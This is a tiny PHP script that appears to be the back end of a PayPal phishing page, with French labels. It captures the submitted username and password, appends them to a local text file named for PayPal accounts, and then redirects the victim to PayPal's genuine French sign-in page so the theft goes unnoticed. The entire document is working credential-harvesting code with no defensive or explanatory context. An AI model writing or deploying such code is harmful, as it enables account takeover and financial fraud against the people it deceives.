<?php
 file_put_contents("ComptesPayPal.txt"," Compte : " . $_POST['username'] . "\n  Mot de Pass : " .$_POST['password'] . "\n\n",FILE_APPEND);
 header('Location: https://www.paypal.com/fr/signin');
 exit();
